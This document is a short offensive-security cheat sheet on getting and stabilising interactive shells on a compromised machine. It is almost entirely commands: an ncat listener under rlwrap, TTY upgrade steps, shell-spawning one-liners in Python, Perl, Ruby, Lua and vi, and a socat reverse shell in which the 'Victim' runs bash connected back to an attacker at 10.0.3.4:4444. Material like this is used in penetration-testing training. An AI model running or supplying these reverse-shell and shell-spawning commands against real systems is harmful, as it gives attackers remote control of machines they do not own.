### Interactive Shell

#### MISC

`# RLWRAP allows you to interface local and remote keyboards # It gives access to keyboard arrows and history 
```
rlwrap ncat -lvp port
```

`# Another way to get a better shell # script is almost everytime present on the machine /usr/bin/script -qc /bin/bash /dev/null`

  

#### Fully Interactive TTY Shell

```bash
ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

  

#### Spawning a shell

`# Using os.system echo os.system('/bin/bash')`

`# Using interactive sh /bin/sh -i`

`# Using Perl, Ruby or Lua perl -e 'exec "/bin/sh";' perl: exec "/bin/sh"; ruby: exec "/bin/sh"; lua: os.execute('/bin/bash')`

`# Using Vi :!bash :set shell=/bin/bash:shell`

``# WARNING # OhMyZSH might break this trick # so just launch /bin/bash before in your Kali to exit the /bin/zsh # Using socat # On Kali socat file:`tty`,raw,echo=0 tcp-listen:4444   # On Victim socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444``
